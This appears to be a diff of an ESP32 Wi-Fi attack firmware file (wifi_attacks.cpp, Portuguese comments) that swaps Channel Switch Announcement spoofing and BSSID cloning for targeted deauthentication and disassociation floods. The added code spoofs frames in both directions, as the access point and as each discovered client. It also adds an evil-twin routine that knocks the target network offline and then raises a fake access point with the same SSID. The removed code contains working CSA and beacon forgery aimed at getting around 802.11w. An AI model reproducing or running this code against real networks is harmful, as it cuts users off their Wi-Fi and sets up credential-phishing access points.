@@ -1,11 +1,16 @@
 // ============================================================
-// wifi_attacks.cpp - CORRIGIDO v3.5
+// wifi_attacks.cpp - CORRIGIDO v4.0
 // FIXES:
-// 1. CSA (Channel Switch Announcement) - NAO protegido por 802.11w
-// 2. CSA Action frame + Beacon com CSA IE
-// 3. Deauth bidirecional como fallback
-// 4. Todos os frames pela WIFI_IF_AP no canal travado
-// 5. Modo AP puro durante ataque
+// 1. Deauth APENAS direcionado ao BSSID alvo (sem CSA broadcast)
+// 2. Ordem corrigida: primeiro deauth, depois clone (evil twin)
+// 3. Sem clone AP durante deauth puro
+// 4. Deauth bidirecional unicast + broadcast
+//
+// Como projetos como ESP32-Marauder e GhostESP fazem:
+// - Deauth flood: SA=BSSID do alvo, DA=broadcast -> so afeta clientes daquele AP
+// - Targeted: deauth bidirecional (AP->STA e STA->AP) para cada cliente descoberto
+// - NUNCA usam CSA broadcast como arma principal (afeta TODOS os clientes 2.4GHz)
+// - Evil Twin: primeiro deauth puro, DEPOIS sobe o clone AP
 // ============================================================
 #include <WiFi.h>
 #include <esp_wifi.h>
@@ -20,16 +25,7 @@ static uint8_t  deauthTargetChannel = 0;
 static uint8_t  deauthTargetBSSID[6] = {0};
 static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
-
-// ============================================================
-// BSSID CLONE - ROGUE AP
-// ============================================================
-static bool bssidCloneActive = false;
-static uint8_t originalAPMac[6] = {0};
-static uint8_t cloneChannel = 0;
-static char cloneSSID[33] = {0};
-static unsigned long cloneStartTime = 0;
-static uint8_t cloneHealthCheckFailures = 0;
+static unsigned long deauthStartTime = 0;
 
 // ============================================================
 // CLIENT DISCOVERY (promiscuous mode)
@@ -134,7 +130,8 @@ static void stopPromiscuous() {
 static uint16_t deauthSeqNum = 0;
 
 static bool raw_tx(const uint8_t* frame, size_t len) {
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
+    // Usa WIFI_IF_STA porque nao subimos AP no deauth puro
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
     if (err == ESP_OK) {
         deauthPacketCount++;
         deauthSuccessCount++;
@@ -144,109 +141,11 @@ static bool raw_tx(const uint8_t* frame, size_t len) {
 }
 
 // ============================================================
-// CSA (CHANNEL SWITCH ANNOUNCEMENT)
-// NAO protegido pelo 802.11w
-// Formato Action Frame: Category=0 (Spectrum Mgmt), Action=4 (CSA)
-// ============================================================
-static void buildCSAActionFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid,
-                                 uint8_t switchMode, uint8_t newChannel, uint8_t switchCount) {
-    // MAC Header (24 bytes)
-    memset(frame, 0, 32);
-    frame[0] = 0xD0; // Management, Action
-    frame[1] = 0x00;
-    frame[2] = 0x00;
-    frame[3] = 0x00;
-    memcpy(&frame[4], da, 6);
-    memcpy(&frame[10], sa, 6);
-    memcpy(&frame[16], bssid, 6);
-    frame[22] = (deauthSeqNum << 4) & 0xFF;
-    frame[23] = (deauthSeqNum >> 4) & 0xFF;
-    deauthSeqNum++;
-
-    // Action Frame Body
-    frame[24] = 0x00; // Category: Spectrum Management
-    frame[25] = 0x04; // Action: Channel Switch Announcement
-
-    // CSA Information Element
-    frame[26] = 0x25; // Element ID: 37 (Channel Switch Announcement)
-    frame[27] = 0x03; // Length: 3
-    frame[28] = switchMode; // Channel Switch Mode (1 = stop transmitting)
-    frame[29] = newChannel; // New Channel Number (255 = invalid, forca desconexao)
-    frame[30] = switchCount; // Channel Switch Count (1 = switch no proximo TBTT)
-}
-
-static void sendCSAAction(const uint8_t* da) {
-    uint8_t frame[32];
-    buildCSAActionFrame(frame, da, deauthTargetBSSID, deauthTargetBSSID, 1, 255, 1);
-    raw_tx(frame, 31);
-}
-
-// ============================================================
-// BEACON COM CSA IE
-// ============================================================
-static void sendBeaconWithCSA(const uint8_t* bssid, const char* ssid, uint8_t channel) {
-    uint8_t beacon[256];
-    memset(beacon, 0, 256);
-
-    // MAC Header
-    beacon[0] = 0x80; // Beacon
-    beacon[1] = 0x00;
-    beacon[2] = 0x00;
-    beacon[3] = 0x00;
-    memset(&beacon[4], 0xFF, 6); // DA = Broadcast
-    memcpy(&beacon[10], bssid, 6); // SA = BSSID
-    memcpy(&beacon[16], bssid, 6); // BSSID
-    beacon[22] = 0x00;
-    beacon[23] = 0x00;
-
-    // Fixed Parameters
-    // Timestamp (8 bytes) - deixar zero
-    // Beacon Interval (2 bytes) = 0x64
-    beacon[32] = 0x64;
-    beacon[33] = 0x00;
-    // Capability Info (2 bytes)
-    beacon[34] = 0x01;
-    beacon[35] = 0x00;
-
-    uint8_t pos = 36;
-    uint8_t ssidLen = strlen(ssid);
-    if (ssidLen > 32) ssidLen = 32;
-
-    // SSID IE
-    beacon[pos++] = 0x00; // Element ID: SSID
-    beacon[pos++] = ssidLen;
-    memcpy(&beacon[pos], ssid, ssidLen);
-    pos += ssidLen;
-
-    // Supported Rates IE
-    beacon[pos++] = 0x01; // Element ID: Supported Rates
-    beacon[pos++] = 0x04; // Length
-    beacon[pos++] = 0x82; // 1 Mbps
-    beacon[pos++] = 0x84; // 2 Mbps
-    beacon[pos++] = 0x8B; // 5.5 Mbps
-    beacon[pos++] = 0x96; // 11 Mbps
-
-    // DS Parameter Set IE
-    beacon[pos++] = 0x03; // Element ID: DS Parameter Set
-    beacon[pos++] = 0x01; // Length
-    beacon[pos++] = channel; // Current Channel
-
-    // CSA IE (Element ID 37)
-    beacon[pos++] = 0x25; // Element ID: 37
-    beacon[pos++] = 0x03; // Length
-    beacon[pos++] = 0x01; // Channel Switch Mode: 1 (stop tx)
-    beacon[pos++] = 0xFF; // New Channel: 255 (invalido)
-    beacon[pos++] = 0x01; // Channel Switch Count: 1
-
-    raw_tx(beacon, pos);
-}
-
-// ============================================================
-// DEAUTH/DISASSOC (fallback)
+// DEAUTH/DISASSOC FRAMES
 // ============================================================
 static void buildDeauthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint8_t reason) {
     memset(frame, 0, 26);
-    frame[0] = 0xC0;
+    frame[0] = 0xC0;  // Deauthentication
     frame[1] = 0x00;
     frame[2] = 0x00;
     frame[3] = 0x00;
@@ -262,7 +161,7 @@ static void buildDeauthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* s
 
 static void buildDisassocFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint8_t reason) {
     memset(frame, 0, 26);
-    frame[0] = 0xA0;
+    frame[0] = 0xA0;  // Disassociation
     frame[1] = 0x00;
     frame[2] = 0x00;
     frame[3] = 0x00;
@@ -277,45 +176,36 @@ static void buildDisassocFrame(uint8_t* frame, const uint8_t* da, const uint8_t*
 }
 
 // ============================================================
-// BURST COMPLETO
+// BURST DEAUTH - APENAS REDE ALVO
 // ============================================================
 static void deauthBurst() {
     uint8_t frame[32];
     const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-    // 1. CSA Action Frame (broadcast) - ARMA PRINCIPAL
-    // NAO protegido por 802.11w. O cliente recebe e desconecta
-    // procurando o AP no canal 255 (inexistente)
-    sendCSAAction(broadcast);
+    // 1. Deauth broadcast do AP alvo para todos os clientes
+    //    (DA=broadcast, SA=BSSID alvo, BSSID=BSSID alvo)
+    //    Clientes de OUTRAS redes ignoram porque o BSSID nao bate com o deles
+    buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x07);
+    raw_tx(frame, 26);
 
-    // 2. CSA Action Frame (unicast para cada cliente)
+    // 2. Disassoc broadcast
+    buildDisassocFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x08);
+    raw_tx(frame, 26);
+
+    // 3. Deauth bidirecional para cada cliente descoberto
     for (int i = 0; i < clientCount; i++) {
-        sendCSAAction(discoveredClients[i]);
-    }
-
-    // 3. Beacon com CSA IE
-    sendBeaconWithCSA(deauthTargetBSSID, deauthTargetSSID, cloneChannel);
-
-    // 4. Deauth fallback (para clientes sem suporte a CSA)
-    for (int i = 0; i < clientCount; i++) {
+        // AP -> Cliente
         buildDeauthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x07);
         raw_tx(frame, 26);
         buildDisassocFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x08);
         raw_tx(frame, 26);
+
+        // Cliente -> AP (spoofing cliente)
+        buildDeauthFrame(frame, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID, 0x07);
+        raw_tx(frame, 26);
+        buildDisassocFrame(frame, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID, 0x08);
+        raw_tx(frame, 26);
     }
-
-    // 5. Broadcast deauth
-    buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x07);
-    raw_tx(frame, 26);
-}
-
-// ============================================================
-// HELPERS
-// ============================================================
-static bool isSoftAPActive() {
-    wifi_mode_t mode;
-    esp_wifi_get_mode(&mode);
-    return (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA);
 }
 
 // ============================================================
@@ -353,11 +243,11 @@ NetworkInfo* getNetwork(uint8_t index) {
 }
 
 // ============================================================
-// BSSID CLONE
+// DEAUTH - APENAS REDE ALVO, SEM CLONE AP
 // ============================================================
-static void startBssidClone(uint8_t networkIndex) {
+void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) {
-        Serial.println("[Clone] ERROR: invalid network index");
+        Serial.println("[Deauth] ERROR: invalid network index");
         return;
     }
 
@@ -368,125 +258,50 @@ static void startBssidClone(uint8_t networkIndex) {
     deauthTargetSSID[32] = '\0';
     deauthTargetChannel = target->channel;
     deauthTargetAuth = target->encrypted ? 1 : 0;
-    cloneChannel = target->channel;
-    strncpy(cloneSSID, target->ssid, 32);
-    cloneSSID[32] = '\0';
-
-    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);
-
-    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
-        target->ssid, target->channel,
-        target->bssid[0], target->bssid[1], target->bssid[2],
-        target->bssid[3], target->bssid[4], target->bssid[5]);
-
-    WiFi.softAPdisconnect(true);
-    WiFi.disconnect(true);
-    WiFi.mode(WIFI_OFF);
-    delay(1000);
-
-    WiFi.mode(WIFI_AP);
-    delay(300);
-
-    esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
-    Serial.printf("[Clone] Set AP MAC: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");
-    delay(100);
-
-    bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
-    WiFi.setTxPower(WIFI_POWER_19_5dBm);
-    Serial.printf("[Clone] softAP: %s\n", apOk ? "OK" : "FAIL");
-
-    if (apOk) {
-        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
-
-        bssidCloneActive = true;
-        deauthActive = true;
-        cloneStartTime = millis();
-        cloneHealthCheckFailures = 0;
-
-        Serial.printf("[Clone] BSSID CLONE ACTIVE on CH%d\n", cloneChannel);
-    } else {
-        Serial.println("[Clone] FAILED");
-    }
-}
-
-static void restartBssidClone() {
-    if (!bssidCloneActive) return;
-    Serial.println("[Clone] Restarting...");
-
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_OFF);
-    delay(500);
-
-    WiFi.mode(WIFI_AP);
-    delay(200);
-
-    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
-    delay(100);
-
-    bool apOk = WiFi.softAP(cloneSSID, "", cloneChannel, 0, 8);
-    WiFi.setTxPower(WIFI_POWER_19_5dBm);
-    if (apOk) {
-        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
-        cloneHealthCheckFailures = 0;
-        Serial.println("[Clone] Restarted OK");
-    } else {
-        cloneHealthCheckFailures++;
-        Serial.printf("[Clone] Restart failed (%d)\n", cloneHealthCheckFailures);
-    }
-}
-
-static void stopBssidClone() {
-    if (!bssidCloneActive) return;
-    Serial.println("[Clone] Stopping...");
-
-    stopPromiscuous();
-
-    WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_OFF);
-    delay(500);
-
-    WiFi.mode(WIFI_AP);
-    delay(200);
-    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
-    delay(100);
-
-    WiFi.mode(WIFI_STA);
-    delay(200);
-
-    bssidCloneActive = false;
-    Serial.println("[Clone] Stopped, MAC restored");
-}
-
-// ============================================================
-// DEAUTH
-// ============================================================
-void startDeauth(uint8_t networkIndex) {
-    if (networkIndex >= networkCount) {
-        Serial.println("[Deauth] ERROR: invalid network index");
-        return;
-    }
 
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
     deauthSeqNum = 0;
     clientCount = 0;
+    deauthStartTime = millis();
 
-    startBssidClone(networkIndex);
+    Serial.printf("[Deauth] Target: %s CH%d BSSID:%02X:%02X:%02X:%02X:%02X:%02X\n",
+        target->ssid, target->channel,
+        target->bssid[0], target->bssid[1], target->bssid[2],
+        target->bssid[3], target->bssid[4], target->bssid[5]);
+
+    // Modo STA puro - SEM clone AP
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_OFF);
+    delay(200);
+    WiFi.mode(WIFI_STA);
+    delay(200);
+
+    // Travar no canal do alvo
+    esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
+
+    // Descobrir clientes
     startPromiscuous();
 
-    Serial.println("[Deauth] STARTED (CSA + Deauth)");
+    deauthActive = true;
+    Serial.println("[Deauth] STARTED - Targeted only");
 }
 
 void stopDeauth() {
     if (deauthActive) {
         Serial.println("[Deauth] STOPPED");
         Serial.printf("[Deauth] Runtime: %lu sec, pkts: %lu\n",
-            (millis() - cloneStartTime) / 1000, deauthPacketCount);
+            (millis() - deauthStartTime) / 1000, deauthPacketCount);
     }
     deauthActive = false;
-    stopBssidClone();
+    stopPromiscuous();
+
+    // Restaura WiFi
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_OFF);
+    delay(200);
+    WiFi.mode(WIFI_STA);
+    delay(200);
 
     deauthPacketCount = 0;
     deauthSuccessCount = 0;
@@ -498,39 +313,23 @@ void stopDeauth() {
 bool deauthLoop() {
     if (!deauthActive) return false;
 
-    esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
-    deauthBurst();
+    // Garante que esta no canal do alvo
+    esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
 
-    static unsigned long lastHealthCheck = 0;
-    if (millis() - lastHealthCheck > 3000) {
-        lastHealthCheck = millis();
-        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
-
-        if (!isSoftAPActive()) {
-            cloneHealthCheckFailures++;
-            if (cloneHealthCheckFailures < 5) {
-                restartBssidClone();
-                startPromiscuous();
-            } else {
-                stopDeauth();
-                return false;
-            }
-        } else {
-            int clients = WiFi.softAPgetStationNum();
-            Serial.printf("[Clone] %d on clone | %d target clients | CH%d\n", 
-                clients, clientCount, cloneChannel);
-        }
+    // Multiplos bursts por chamada
+    for (int burst = 0; burst < 4; burst++) {
+        deauthBurst();
     }
 
+    // Debug a cada 5 segundos
     static unsigned long lastDebug = 0;
     if (millis() - lastDebug > 5000) {
         lastDebug = millis();
-        Serial.printf("[Deauth] runtime=%lus pkts=%lu clients=%d/%d CH%d\n",
-            (millis() - cloneStartTime) / 1000,
+        Serial.printf("[Deauth] runtime=%lus pkts=%lu clients=%d CH%d\n",
+            (millis() - deauthStartTime) / 1000,
             deauthPacketCount,
-            WiFi.softAPgetStationNum(),
             clientCount,
-            cloneChannel);
+            deauthTargetChannel);
     }
 
     return true;
@@ -570,10 +369,22 @@ bool isFakeAPActive() { return fakeAPEnabled; }
 
 void startEvilTwin(uint8_t networkIndex) {
     if (networkIndex >= networkCount) return;
+
+    // FASE 1: Deauth puro primeiro (derruba a rede alvo)
     startDeauth(networkIndex);
-    delay(3000);
+
+    // Deixa derrubar por 3 segundos
+    unsigned long start = millis();
+    while (millis() - start < 3000) {
+        deauthLoop();
+        delay(1);
+    }
+
+    // FASE 2: Para deauth e sobe o fake AP
     stopDeauth();
     startFakeAP(scannedNetworks[networkIndex].ssid);
+
+    Serial.println("[EvilTwin] Clone AP ativo apos deauth");
 }
 
 // ============================================================
